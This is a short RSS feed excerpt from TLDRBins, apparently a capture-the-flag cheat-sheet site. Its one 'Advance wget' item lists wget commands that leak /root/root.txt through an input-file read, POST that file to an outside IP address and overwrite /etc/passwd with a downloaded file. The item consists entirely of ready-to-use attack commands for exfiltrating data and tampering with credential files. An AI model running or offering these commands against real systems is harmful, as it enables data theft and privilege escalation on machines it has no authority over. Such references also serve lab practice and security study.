channel.title: Wget on TLDRBins
channel.description: Recent content in Wget on TLDRBins

item.title: Advance wget
item.description: Advance wget # Provide a file with urls wget --input-file /root/root.txt # POST a file wget --post-file /root/root.txt http://10.10.14.10 # Overwrite a file wget http://10.10.14.10/passwd.txt -O /etc/passwd
